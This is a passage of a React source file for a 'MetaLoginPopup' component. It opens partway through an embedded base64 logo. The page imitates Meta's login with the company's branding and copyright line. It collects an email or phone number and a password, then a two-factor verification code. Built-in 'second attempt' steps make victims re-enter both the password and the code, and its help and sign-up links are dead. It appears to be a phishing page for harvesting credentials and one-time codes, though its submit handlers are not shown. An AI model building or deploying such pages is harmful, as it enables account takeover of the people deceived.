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"
    alt="Meta Logo"
    style={{ height: '110px', width: 'auto', display: 'block', margin: '0 auto' }}
  />
</div>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                      <Input 
                        id="email" 
                        type="text"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Email or phone number"
                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"}`}
                        disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                    </div>
                  </div>
                  
                  <div className="mb-4">
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                      <Input 
                        id="password" 
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password"
                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"} pr-10`}
                        autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                      <button
                        type="button"
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                        onClick={() => setShowPassword(!showPassword)}
                        tabIndex={-1}
                      >
                        {showPassword ? (
                          <EyeOff className="h-5 w-5" />
                        ) : (
                          <Eye className="h-5 w-5" />
                        )}
                      </button>
                    </div>
                    
                    {/* Error message appears below password field */}
                    {errorMessage && (
                      <div className="flex items-center mt-1 text-red-500 text-sm">
                        <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
                        <span>{errorMessage}</span>
                      </div>
                    )}
                  </div>
                  
                  <div className="pt-2">
                    <Button 
                      type="submit" 
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          <span>Authenticating...</span>
                        </div>
                      ) : (
                        "Continue"
                      )}
                    </Button>
                  </div>
                  
                  <div className="flex justify-between items-center pt-3 pb-2">
                    <div className="flex items-center">
                      <input type="checkbox" id="remember" className="mr-2 h-4 w-4" />
                      <Label htmlFor="remember" className="text-sm text-gray-600">Remember me</Label>
                    </div>
                    <a href="#" className="text-blue-600 text-sm hover:underline">
                      Forgot password?
                    </a>
                  </div>
                  
                  <div className="relative my-6">
                    <div className="absolute inset-0 flex items-center">
                      <div className="w-full border-t border-gray-300"></div>
                    </div>
                    <div className="relative flex justify-center">
                      <span className="px-2 bg-white text-gray-500 text-sm">Or</span>
                    </div>
                  </div>
                  
                  <div className="flex justify-center">
                    <Button
                      type="button"
                      className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 border border-gray-300 h-[48px] rounded-md font-medium text-[15px]"
                      onClick={(e) => e.preventDefault()}
                    >
                      Sign up for Meta
                    </Button>
                  </div>
                </form>
              )}
              
              {/* 2FA Verification Steps */}
              {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                <>
                  <div className="text-center mb-6">
                    <div className="mx-auto mb-6 flex justify-center">
                      <img 
                        src="/assets/two-factor-auth.jpg" 
                        alt="Two-Factor Authentication" 
                        className="h-40 object-contain rounded-lg"
                      />
                    </div>
                    <h3 className="text-2xl font-semibold text-gray-800">Security Verification</h3>
                    <p className="text-gray-600 mt-3 text-sm">
                      We've sent a verification code to your device. Please enter it below to continue.
                    </p>
                  </div>
                  
                  <form onSubmit={handleVerificationSubmit} className="space-y-4">
                    <div className="mb-4">
                      <div className="relative">
                        <Input 
                          id="code" 
                          type="text"
                          inputMode="numeric"
                          ref={codeInputRef}
                          value={verificationCode}
                          onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                          placeholder="6-digit verification code"
                          className={`h-[50px] rounded-md text-lg text-center bg-gray-50 border ${verificationError ? "border-red-500" : "border-gray-300"}`}
                          disabled={isLoading || cooldownActive}
                          maxLength={8}
                        />
                      </div>
                      
                      {verificationError && (
                        <div className="flex items-center mt-1 text-red-500 text-sm">
                          <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
                          <span>{verificationError}</span>
                        </div>
                      )}
                      
                      {cooldownActive && (
                        <div className="flex items-center mt-3 text-red-600 text-sm">
                          <AlertTriangle className="h-4 w-4 mr-1 flex-shrink-0" />
                          <span>Please wait {countdown} seconds before trying again</span>
                        </div>
                      )}
                    </div>
                    
                    <div className="pt-2">
                      <Button 
                        type="submit" 
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
                        disabled={isLoading || cooldownActive}
                      >
                        {isLoading ? (
                          <div className="flex items-center justify-center">
                            <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                            <span>Verifying code...</span>
                          </div>
                        ) : cooldownActive ? (
                          `Try again in ${countdown}s`
                        ) : (
                          "Verify Identity"
                        )}
                      </Button>
                    </div>
                    
                    <div className="flex justify-between items-center pt-4">
                      <a 
                        href="#" 
                        className={`text-blue-600 text-sm ${cooldownActive ? "opacity-50 pointer-events-none" : "hover:underline"}`}
                        onClick={(e) => e.preventDefault()}
                      >
                        Resend code
                      </a>
                      <a 
                        href="#" 
                        className={`text-blue-600 text-sm ${cooldownActive ? "opacity-50 pointer-events-none" : "hover:underline"}`}
                        onClick={(e) => e.preventDefault()}
                      >
                        Try another method
                      </a>
                    </div>
                  </form>
                </>
              )}
            </>
          )}
        </div>
      </main>
      
      <footer className="mt-auto py-4 bg-gray-50">
        <div className="max-w-[980px] mx-auto px-4">
          <div className="flex flex-wrap justify-center gap-x-4 text-xs text-gray-500 mb-2">
            <a href="#" className="hover:underline">English</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Français</a>
            <a href="#" className="hover:underline">中文</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">Português</a>
          </div>
          
          <div className="border-t border-gray-200 pt-3">
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-gray-500">
              <a href="#" className="hover:underline">About</a>
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Terms</a>
              <a href="#" className="hover:underline">Cookies</a>
              <a href="#" className="hover:underline">Help Center</a>
            </div>
            <div className="text-center text-xs text-gray-500 mt-3">
              <p>© Meta Platforms, Inc. {new Date().getFullYear()}</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MetaLoginPopup;